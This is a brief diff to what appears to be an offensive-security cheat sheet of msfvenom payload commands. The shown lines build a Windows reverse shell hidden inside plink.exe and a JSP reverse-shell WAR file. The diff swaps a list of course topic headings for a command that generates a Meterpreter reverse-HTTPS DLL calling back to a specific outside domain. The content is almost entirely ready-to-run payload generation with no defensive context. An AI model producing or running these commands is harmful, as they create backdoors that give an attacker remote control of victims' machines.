@@ -17,8 +17,4 @@ msfvenom -a x86 --platform windows -x /var/www/html/plink.exe -p windows/shell_r
 WAR
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=$ip LPORT=443 -f war > r-jsp-shell-443.war
 
-Client Side Attacks
-86 Client Side Attacks
-140 Client Side Attack
-87 Replacing Shellcode
-88 Java Applets
+msfvenom -p windows/x64/meterpreter_reverse_https LHOST=unioncentralorchids.com LPORT=443 -f dll
